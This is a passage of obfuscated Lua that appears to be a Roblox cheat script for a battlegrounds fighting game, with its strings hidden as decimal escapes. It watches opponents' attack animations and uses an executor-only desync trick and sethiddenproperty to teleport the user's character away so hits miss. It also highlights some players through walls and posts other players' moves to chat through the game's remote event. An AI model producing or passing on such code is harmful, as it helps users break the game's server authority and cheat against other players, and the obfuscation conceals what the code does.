 else local _lIllIIIIlI = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):FindFirstChild("\068\101\102\097\117\108\116\067\104\097\116\083\121\115\116\101\109\067\104\097\116\069\118\101\110\116\115") local _IlllIIIIIl = _lIllIIIIlI and _lIllIIIIlI:FindFirstChild("\083\097\121\077\101\115\115\097\103\101\082\101\113\117\101\115\116") if _lIllIIIIlI and _IlllIIIIIl then _IlllIIIIIl:FireServer("\10071" .. _lllIIlllll.DisplayName .. "\032\117\115\101\100\032" .. moveName .. "\10071", "\097\108\108") end
 end
 end
 ) end
 end
 local function _IllIlIIllI() return _lIIIllllII end
 local function _IIllllIIIl(_IIllllIlII) local _IIlIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChild("\068\101\097\116\104\067\111\117\110\116\101\114\085\108\116\072\105\103\104\108\105\103\104\116") if _IIlIIlIIII then pcall( function () _IIlIIlIIII:Destroy() end
 ) end
 end
 local function _IllIllIIIl(_IIllllIlII) if not _IIllllIlII or _IIllllIlII.Name == "\087\101\097\107\101\115\116\032\068\117\109\109\121" then return end
 local _IIlIllIllI = Players:GetPlayerFromCharacter(_IIllllIlII) if not _IIlIllIllI or _IIlIllIllI == _llIIIlIIll then return end
 local _IlIlIIllIl = _IIllllIlII:FindFirstChild("\067\111\117\110\116\101\114") ~= nil local _IIIllIIIII = _IllIlIIllI() and _IIllllIlII:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\108\100" and _IIllllIlII:GetAttribute("\085\108\116\101\100") == true and not _IlIlIIllIl local _IIlIIlIIII = _IIllllIlII:FindFirstChild("\068\101\097\116\104\067\111\117\110\116\101\114\085\108\116\072\105\103\104\108\105\103\104\116") if _IIIllIIIII then if not _IIlIIlIIII then _IIlIIlIIII = Instance.new("\072\105\103\104\108\105\103\104\116") _IIlIIlIIII.Name = "\068\101\097\116\104\067\111\117\110\116\101\114\085\108\116\072\105\103\104\108\105\103\104\116" _IIlIIlIIII.Adornee = _IIllllIlII _IIlIIlIIII.Parent = _IIllllIlII end
 _IIlIIlIIII.FillColor = Color3.fromRGB(0xFF, 0xFF, 0x0) _IIlIIlIIII.OutlineColor = Color3.fromRGB(0xFF, 0xFF, 0x0) _IIlIIlIIII.FillTransparency = 0.5 _IIlIIlIIII.OutlineTransparency = 0x0 _IIlIIlIIII.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop elseif _IIlIIlIIII then pcall( function () _IIlIIlIIII:Destroy() end
 ) end
 end
 local function _lIIlllllll(_IIllllIlII) if not _IIllllIlII or _llllllIIIl[_IIllllIlII] then return end
 _llllllIIIl[_IIllllIlII] = true _IllIllIIIl(_IIllllIlII) table.insert(_lIlllIIIII, _IIllllIlII:GetAttributeChangedSignal("\085\108\116\101\100"):Connect( function () _IllIllIIIl(_IIllllIlII) end
 )) table.insert(_lIlllIIIII, _IIllllIlII:GetAttributeChangedSignal("\067\104\097\114\097\099\116\101\114"):Connect( function () _IllIllIIIl(_IIllllIlII) end
 )) table.insert(_lIlllIIIII, _IIllllIlII.ChildAdded:Connect( function (_IIlIlIIIII) if _llIIIIIllI(_IIlIlIIIII) then _IllIllIIIl(_IIllllIlII) end
 end
 )) table.insert(_lIlllIIIII, _IIllllIlII.ChildRemoved:Connect( function (_IIlIlIIIII) if _llIIIIIllI(_IIlIlIIIII) then _IllIllIIIl(_IIllllIlII) end
 end
 )) end
 local function _IIIlllIlll(_lllIIlllll) if _lllIIlllll == _llIIIlIIll then return end
 if _lllIIlllll.Character then _lIIlllllll(_lllIIlllll.Character) end
 table.insert(_lIlllIIIII, _lllIIlllll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _lIIlllllll(_IIllllIlII) end
 )) end
 _IllIlIlIll = function () for _lllIlllIIl, _lllIIlllll in pairs(Players:GetPlayers()) do if _lllIIlllll.Character then _IllIllIIIl(_lllIIlllll.Character) end
 end
 end
 for _lllIlllIIl, _lllIIlllll in pairs(Players:GetPlayers()) do _IIIlllIlll(_lllIIlllll) end
 table.insert(_lIlllIIIII, Players.PlayerAdded:Connect(_IIIlllIlll)) table.insert(_lIlllIIIII, Players.PlayerRemoving:Connect( function (_lllIIlllll) if _lllIIlllll.Character then _IIllllIIIl(_lllIIlllll.Character) end
 end
 )) table.insert(_llIlllIlIl, function () for _lllIlllIIl, _IllIIIllII in pairs(_lIlllIIIII) do pcall(_IllIIIllII.Disconnect, _IllIIIllII) end
 _lIlllIIIII = {} _llllllIIIl = setmetatable({}, { __mode = "\107" }) for _lllIlllIIl, _lllIIlllll in pairs(Players:GetPlayers()) do if _lllIIlllll.Character then _IIllllIIIl(_lllIIlllll.Character) end
 end
 end
 ) _IlIlllIlII = {} _llIllIIlIl = {} local _IIIlIIllIl = false local _lllllIIIII = _llIIIlIIll.CharacterAdded:Connect( function () getgenv().desync = nil end
 ) _lIlIlIIIIl = function (_IlIIIlIIII) if not _IlIIIlIIII then return false end
 local _llIIlIIlII = _IlIIIlIIII:FindFirstAncestorWhichIsA("\077\111\100\101\108") if _llIIlIIlII and _llIIlIIlII:FindFirstChild("\067\111\117\110\116\101\114") then return true end
 for _lllIlllIIl, _IIlIIllIIl in pairs(_IlIIIlIIII:GetPlayingAnimationTracks()) do local _IIIIllIIlI = _IIlIIllIIl.Animation.AnimationId if _IIIIllIIlI:match("\049\051\055\050\054\050\050\054\057\048\053") or _IIIIllIIlI:match("\049\051\055\050\054\050\051\053\052\049\053") then return true end
 end
 return false end
 _IlIIIIIIlI = function (_lllIIlllll, _IIllllIlII) if not _IIllllIlII then return end
 if _IlIlllIlII[_lllIIlllll] then pcall( function () _IlIlllIlII[_lllIIlllll]:Disconnect() end
 ) _IlIlllIlII[_lllIIlllll] = nil end
 repeat task.wait() until not _IIllllIlII.Parent or (_IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100")) if not _IIllllIlII.Parent then return end
 local _IllllllIlI = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIlllIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IllllllIlI and _IlIlllIlIl) then return end
 local function _IIlIlIIlIl(_IlIIIlIIII, _IIIIllIIlI) local _llIlIlIIlI = tostring(_IIIIllIIlI):match("\037\100\043") for _lllIlllIIl, _IIlIIllIIl in pairs(_IlIIIlIIII:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match(_llIlIlIIlI) then return _IIlIIllIIl end
 end
 return nil end
 local _IllIIIllII = _IlIlllIlIl.AnimationPlayed:Connect( function (_llIIllIlIl) if _IllIIlIIll.Unloaded then return end
 local _IlllIllIII = _llIIllIlIl.Animation.AnimationId local _lIIllIIllI = _llIIIlIIll.Character local _IIIlIIIllI = _lIIllIIllI and _lIIllIIllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_lIIllIIllI and _IIIlIIIllI) then return end
 task.spawn( function () if _llIIllIlIl.WeightTarget == 0x0 or _llIIllIlIl.Speed == 0x0 then return end
 local _IIIlIlIIlI = CFrame.new(9e9, 9e9, 9e9) local _lIlllIllll = _lIIllIIllI and _lIIllIIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local function _lIIlIlllIl(condFn) pcall( function () repeat getgenv().desync = { CFrame = _IIIlIlIIlI } task.wait() local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IIIlIlllll and _IlIIIIIIll and _IlIIIIlIIl) then return end
 _IIIlIIIllI = _IlIIIIIIll _lIlllIllll = _IlIIIIlIIl until condFn() end
 ) getgenv().desync = nil if _llIllllllI then local _IIIIIlIIll = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIIIlIIll then pcall( function () sethiddenproperty(_IIIIIlIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 end
 local function _lIlIIIIllI(_IlIIIlIIII) if not _IlIIIlIIII then return false end
 local _llIIlIIlII = _IlIIIlIIII:FindFirstAncestorWhichIsA("\077\111\100\101\108") return _llIIlIIlII and _llIIlIIlII:FindFirstChild("\067\111\117\110\116\101\114") and true or false end
 local function _IIlIIlIIll(size) local _IIIIIlIlll = Instance.new("\080\097\114\116", workspace) _IIIIIlIlll.Anchored = true _IIIIIlIlll.Size = size _IIIIIlIlll.CanCollide = false _IIIIIlIlll.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _IIIIIlIlll.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _IIIIIlIlll.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) return _IIIIIlIlll, function () return _IlllIIllll end
 , function () pcall( function () _IIIIIlIlll:Destroy() end
 ) _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() end
 end
 local function _lIlllllIlI() local _IlIIllllll = getgenv().InvisPart30 if getgenv().InvisActive and _IlIIllllll then return _IlIIllllll.Position end
 return _IIIlIIIllI.Position end
 if _IlllIllIII:match("\049\048\052\054\056\054\054\053\057\057\049") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\078\111\114\109\097\108\032\080\117\110\099\104") then local _IlIlllIlII = {} local _IlllIIllII = { CFrame.new(0x6, 0x0, -37.5) * CFrame.Angles(0x0, math.rad(-0x5), 0x0), CFrame.new(-0x6, 0x0, -37.5) * CFrame.Angles(0x0, math.rad(0x5), 0x0), CFrame.new(0x0, 0x0, -37.5), } local _IIlIIIllll = {Vector3.new(12.5,0x5,0x4B), Vector3.new(12.5,0x5,0x4B), Vector3.new(12.5,0x5,0x4B)} local _IlllIIllll = {false,false,false} local _llIIlllIll = {} for _lIllIIIIII = 0x1, 0x3 do local _IIIIIlIlll = Instance.new("\080\097\114\116", workspace) _IIIIIlIlll.Anchored = true _IIIIIlIlll.Size = _IIlIIIllll[_lIllIIIIII] _IIIIIlIlll.CanCollide = false _IIIIIlIlll.Transparency = 0x1 table.insert(_IlIlllIlII, _IIIIIlIlll) local _lIlllIlIll = _lIllIIIIII table.insert(_llIIlllIll, _IIIIIlIlll.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll[_lIlllIlIll] = true end
 end
 )) table.insert(_llIIlllIll, _IIIIIlIlll.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll[_lIlllIlIll] = false end
 end
 )) end
 local _IIlIIllIIl = tick() repeat for _lIllIIIIII, _IIIIIlIlll in ipairs(_IlIlllIlII) do _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * _IlllIIllII[_lIllIIIIII] end
 if (_IlllIIllll[0x1] or _IlllIIllll[0x2] or _IlllIIllll[0x3]) and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0.8 or not _llIIllIlIl.IsPlaying getgenv().desync = nil for _lllIlllIIl, _IIIlIlllll in ipairs(_llIIlllIll) do _IIIlIlllll:Disconnect() end
 for _lllIlllIIl, _IIIIIlIlll in ipairs(_IlIlllIlII) do pcall( function () _IIIIIlIlll:Destroy() end
 ) end
 end
 if _IlllIllIII:match("\049\048\052\054\054\057\055\052\056\048\048") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(12.5,0x5,12.5)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-6.25) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 1.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\048\052\055\049\051\051\054\055\051\055") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\083\104\111\118\101") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(7.5,0x5,7.5)) _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-3.75) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-3.75) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\050\053\049\048\049\055\048\057\056\056") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\085\112\112\101\114\099\117\116") then task.wait(0.25) if not _llIIllIlIl.IsPlaying then return end
 local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(0xA,0xA,0xA)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-0x5) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\050\057\056\051\051\051\051\055\051\051") and _IIllllIlII:GetAttribute("\085\108\116\101\100") ~= nil then MoveNotify(_lllIIlllll, "\083\101\114\105\111\117\115\032\080\117\110\099\104") end
 if _IlllIllIII:match("\049\050\057\056\051\051\051\051\055\051\051") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\083\101\114\105\111\117\115\032\080\117\110\099\104") and _IIllllIlII:GetAttribute("\085\108\116\101\100") ~= nil then task.delay(0x1, function () if _IIllllIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108", true) and _IIllllIlII:FindFirstChild("\070\114\101\101\122\101") then task.wait(4.25) local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x96 or tick() >= _IIlIIllIIl + 0x2 or not _llIIllIlIl.IsPlaying end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\049\051\054\053\053\054\051\050\053\053") and _IIllllIlII:GetAttribute("\085\108\116\101\100") ~= nil then MoveNotify(_lllIIlllll, "\084\097\098\108\101\032\070\108\105\112") end
 if _IlllIllIII:match("\049\049\051\054\053\053\054\051\050\053\053") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\084\097\098\108\101\032\070\108\105\112") and _IIllllIlII:GetAttribute("\085\108\116\101\100") ~= nil then task.delay(0x1, function () if _IIllllIlII:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108", true) and _IIllllIlII:FindFirstChild("\070\114\101\101\122\101") then task.wait(0x3) local _lIlIIllIIl = tick() _lIIlIlllIl( function () return tick() >= _lIlIIllIIl + 2.5 end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\051\057\050\055\054\049\050\057\053\049") and _IIllllIlII:GetAttribute("\085\108\116\101\100") ~= nil then MoveNotify(_lllIIlllll, "\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104") end
 if _IlllIllIII:match("\049\051\057\050\055\054\049\050\057\053\049") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104") and _IIllllIlII:GetAttribute("\085\108\116\101\100") ~= nil then local _lIlIIlIIII = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x96 or tick() >= _lIlIIlIIII + 2.5 end
 ) end
 if _IlllIllIII:match("\049\050\051\052\050\049\052\049\052\054\052") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\071\097\114\111\117\032\085\108\116") then task.wait(3.5) local _IIIlIIllIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x7D or tick() >= _IIIlIIllIl + 1.25 end
 ) end
 if _IlllIllIII:match("\049\050\052\054\051\048\055\050\054\055\057") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\105\110\097\108\032\072\117\110\116") then local _IllIIIlIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x19 or tick() >= _IllIIIlIlI + 0.75 end
 ) end
 if _IlllIllIII:match("\049\050\050\055\050\056\057\052\050\049\053") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(0xA,0x5,0xA)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-0x5) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\050\050\055\051\049\056\056\055\053\052") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(0xF,0x5,0xF)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-7.5) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0x2 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\052\051\055\052\051\053\055\051\053\049") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(0xA,0x5,0xF)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-7.5) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 1.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() task.wait(0.5) local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x19 or tick() >= _IIlIllIIlI + 1.25 end
 ) end
 if _IlllIllIII:match("\049\050\050\057\054\056\056\050\052\050\055") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - (_IllllllIlI.CFrame * CFrame.new(0x0,0x0,-2.5)).Position).Magnitude > 0xA or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIIllIIl + 0.5 end
 ) end
 if _IlllIllIII:match("\049\050\050\057\054\049\049\051\057\056\054") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xF or tick() >= _IIlIIllIIl + 0.5 end
 ) task.delay(1.35, function () local _IIlIllIIlI = tick() repeat task.wait() until (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0xF or tick() >= _IIlIllIIlI + 0.65 if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0xF then local _IlIIIIllII = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xF or tick() >= _IlIIIIllII + 0.65 end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\052\055\057\056\054\048\056\056\051\056") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109") then task.delay(0.75, function () local _IIlIIllIIl = tick() repeat task.wait() until (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x19 or tick() >= _IIlIIllIIl + 0.75 if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x19 then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x19 or tick() >= _IIlIllIIlI + 0.75 end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\050\051\048\055\054\053\054\054\049\054") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\072\117\110\116\101\114\115\032\071\114\097\115\112") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - (_IllllllIlI.CFrame * CFrame.new(0x0,0x0,-2.5)).Position).Magnitude > 0xA or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIIllIIl + 0.35 end
 ) end
 if _IlllIllIII:match("\049\051\054\048\051\051\057\054\057\051\057") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\080\114\101\121\115\032\080\101\114\105\108") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - (_IllllllIlI.CFrame * CFrame.new(0x0,0x0,-0x1)).Position).Magnitude > 7.5 or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIIllIIl + 2.5 end
 ) end
 if _IlllIllIII:match("\049\050\052\054\048\057\055\055\050\055\048") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\087\097\116\101\114\032\083\116\114\101\097\109\032\082\111\099\107\032\083\109\097\115\104\105\110\103\032\070\105\115\116") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(12.5,0x5,12.5)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-6.25) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 1.85 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\052\048\053\055\050\051\049\057\055\054") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xA or tick() >= _IIlIIllIIl + 0.5 end
 ) task.wait(0.5) local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xA or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIllIIlI + 1.25 end
 ) end
 if _IlllIllIII:match("\049\051\054\051\048\055\056\054\056\052\054") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\067\114\117\115\104\101\100\032\082\111\099\107") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(0x19,0xA,0x4B)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-37.5) if isTouched() and not _lIlIlIIIIl(_IlIlllIlIl) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 1.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\055\050\052\053\049\055\049\053\053\056\051\050\050\053") and rawget(_IlIllIIllI.AntiMoves_Garou.Value, "\065\110\116\105\032\067\114\117\115\104\101\100\032\082\111\099\107") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xF or tick() >= _IIlIIllIIl + 0.75 end
 ) end
 if _IlllIllIII:match("\049\051\056\049\051\057\053\053\049\052\057") and _IIlIlIIlIl.AntiMoves_Trashcan and _IIlIlIIlIl.AntiMoves_Trashcan.Value then if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x19 then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait(0.75) getgenv().desync = nil end
 local _lIlIlIIlll = nil _lIlIlIIlll = workspace.Thrown.ChildAdded:Connect( function (_IIIIIlIlll) if _IIIIIlIlll:IsA("\077\101\115\104\080\097\114\116") and _IIIIIlIlll.Name:lower() == "\116\114\097\115\104\032\099\097\110" then _lIlIlIIlll:Disconnect() local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IIIIIlIlll.Position).Magnitude > 0x19 or tick() >= _IIlIIllIIl + 0x2 end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\053\049\050\056\056\052\057\048\052\055") then MoveNotify(_lllIIlllll, "\068\101\097\116\104\032\066\108\111\119") end
 if _IlllIllIII:match("\049\053\049\050\056\056\052\057\048\052\055") and rawget(_IlIllIIllI.AntiMoves_MetalBat.Value, "\065\110\116\105\032\068\101\097\116\104\032\066\108\111\119") then local _lIlIIIIllI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x64 or _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\051\054\054\053\052\057\049") or tick() >= _lIlIIIIllI + 0x3 end
 ) end
 if _IlllIllIII:match("\049\053\051\057\049\051\050\051\052\052\049") and rawget(_IlIllIIllI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105\032\085\108\116") then task.wait(5.5) local _IlllIlIlIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x7D or tick() >= _IlllIlIlIl + 0x1 end
 ) end
 if _IlllIllIII:match("\049\054\048\056\050\049\050\051\055\049\050") and rawget(_IlIllIIllI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104") then task.wait(2.5) local _IllIIlIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or tick() >= _IllIIlIIlI + 1.5 end
 ) end
 if _IlllIllIII:match("\049\052\055\049\057\050\057\048\051\050\056") and rawget(_IlIllIIllI.AntiMoves_MetalBat.Value, "\065\110\116\105\032\083\097\118\097\103\101\032\084\111\114\110\097\100\111") then if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x32 then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } end
 task.wait(0.5) if _llIIllIlIl.IsPlaying then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or _lIlIIIIllI(_lIlllIllll) or tick() >= _IIlIIllIIl + 3.5 or not _llIIllIlIl.IsPlaying end
 ) end
 end
 if _IlllIllIII:match("\049\053\053\050\048\049\051\050\050\051\051") and rawget(_IlIllIIllI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\083\117\110\115\101\116") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or _lIlIIIIllI(_lIlllIllll) or tick() >= _IIlIIllIIl + 3.3 or not _llIIllIlIl.IsPlaying end
 ) repeat task.wait() until tick() >= _IIlIIllIIl + 5.5 local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x64 or _lIlIIIIllI(_lIlllIllll) or tick() >= _IIlIllIIlI + 0x1 or not _llIIllIlIl.IsPlaying end
 ) end
